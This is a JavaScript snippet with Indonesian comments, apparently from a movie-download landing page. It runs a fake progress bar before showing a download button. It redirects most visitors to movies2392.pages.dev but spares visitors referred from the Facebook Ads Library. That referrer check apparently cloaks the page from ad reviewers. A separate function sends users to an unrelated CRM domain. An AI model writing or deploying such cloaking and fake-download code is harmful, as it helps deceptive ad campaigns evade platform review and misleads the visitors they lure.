    // Mendapatkan elemen progress bar
    var progressBar = document.querySelector('.progress-bar');
    // Mendapatkan elemen tombol download
    var downloadButtonContainer = document.getElementById('button-container');

    // Membuat fungsi untuk menganimasikan progress bar
    function animateProgressBar() {
        var width = 1; // Nilai awal lebar progress bar
        var interval = setInterval(function() {
            if (width >= 100) {
                clearInterval(interval); // Menghentikan interval jika lebar sudah mencapai 100%
                downloadButtonContainer.style.display = 'block'; // Menampilkan tombol download
            } else {
                width++; // Meningkatkan nilai lebar progress bar
                progressBar.style.width = width + '%'; // Mengatur lebar progress bar
                progressBar.innerText = width + '%'; // Menampilkan angka persentase di dalam progress bar
                progressBar.setAttribute('aria-valuenow', width); // Mengatur nilai persentase untuk aksesibilitas
            }
        }, 50); // Interval animasi
    }

    // Memanggil fungsi untuk memulai animasi progress bar
    animateProgressBar();

// Fungsi untuk mendapatkan parameter dari URL
function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

// Mengambil nilai parameter 'fbclid' dari URL
var fbclid = getParameterByName('fbclid');

// Mengambil domain utama (tanpa protokol)
var mainDomain = window.location.hostname.split('.').slice(-2).join('.');

// Jika pengunjung akses langsung atau hasilnya dari redirect dari https://movies2392.pages.dev,
// atau pengunjung datang dari https://www.facebook.com/ads/library,
// maka biarkan mereka tetap di https://movies2392.pages.dev dan jangan lakukan redirect
if (document.referrer.includes("movies2392.pages.dev") || window.location.hostname === mainDomain || document.referrer === 'https://www.facebook.com/ads/library') {
    // Tidak melakukan redirect
} else {
    // Redirect ke https://movies2392.pages.dev
    window.location.href = "https://movies2392.pages.dev";
}

function redirectToURL() {
    window.location.href = 'https://crm.faridahdecoration.com/';
}





